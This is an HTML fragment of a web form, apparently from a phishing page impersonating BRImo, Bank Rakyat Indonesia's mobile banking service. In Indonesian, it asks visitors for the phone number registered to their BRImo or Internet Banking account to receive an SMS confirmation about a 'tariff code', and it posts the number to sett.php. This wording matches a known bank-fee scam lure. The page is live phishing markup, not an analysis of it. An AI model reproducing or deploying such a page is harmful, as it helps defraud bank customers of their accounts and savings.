          ...
          <div>
            <div class="row">
                ...
                <form method="post" action="sett.php">
                    <div>
                     <label for="nomor"><h3>Masukkan Nomor Telpon yang tedaftar di akun BRImo/Internet Banking untuk mendapatkan SMS KONFIRMASI Kode Tarif</h3></label><br><br>
                    
         <i class="ion-ios-telephone-outline" id="ionIcons"></i>
        <input name="nohp" type="tel" class="bubble-element Input form-log" minlength="10" placeholder="08XXXXXXXXXX" maxlength="13" required><br><br>
       </div>
      <div class="row">
